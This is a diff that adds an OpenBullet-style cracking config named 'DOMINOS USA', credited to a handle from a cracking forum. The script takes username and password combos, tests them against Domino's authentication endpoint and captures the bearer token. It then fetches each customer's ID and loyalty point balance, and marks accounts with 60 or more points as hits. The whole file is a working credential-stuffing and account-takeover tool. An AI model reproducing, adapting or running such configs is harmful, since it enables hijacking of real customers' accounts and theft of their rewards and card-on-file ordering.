@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "DOMINOS USA",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-21T01:43:54.6840657-05:00",
+  "AdditionalInfo": "",
+  "Author": "SLAYA ON C.TO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://authproxy.dominos.com/auth-proxy-service/login" 
+  CONTENT "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username & password" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\",\"" -> VAR "TOKEN" 
+
+REQUEST POST "https://order.dominos.com/power/login" 
+  CONTENT "loyaltyIsActive=true&rememberMe=false&u=<USER>&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+
+PARSE "<SOURCE>" LR ",\"CustomerID\":\"" "\",\"" -> VAR "ID" 
+
+REQUEST GET "https://order.dominos.com/power/customer/<ID>/loyalty?_=1581984138984" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+
+PARSE "<SOURCE>" LR "VestedPointBalance\":" ",\"" CreateEmpty=FALSE -> CAP "POINTS" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<POINTS>" GreaterThan "59" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<POINTS>" LessThan "60" 
+
